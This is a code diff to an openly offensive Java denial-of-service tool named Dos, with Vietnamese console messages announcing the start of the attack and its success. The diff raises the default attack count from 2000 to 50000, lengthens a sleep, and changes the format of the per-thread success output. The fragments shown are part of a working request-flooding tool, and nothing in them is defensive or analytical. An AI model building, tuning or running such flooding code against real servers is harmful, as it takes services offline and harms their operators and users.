@@ -72,7 +72,7 @@ public class Dos implements Runnable {
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
-            Dos.amount = 2000;
+            Dos.amount = 50000;
         } else {
             Dos.amount = Integer.parseInt(amount);
         }
@@ -94,7 +94,7 @@ public class Dos implements Runnable {
             }
         }
 
-        Thread.sleep(2000);
+        Thread.sleep(50000);
 
 
         System.out.println("--> Bắt Đầu Tấn Công!");
@@ -158,7 +158,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("Tấn Công Thành Công! ┊" + responseCode + " Số Luồng : " + this.seq);
+        System.out.println("Tấn Công Thành Công! ┊" + responseCode + ("┊") +  " Số Luồng : " + this.seq);
     }
 
     private void getAttack(String url) throws Exception {
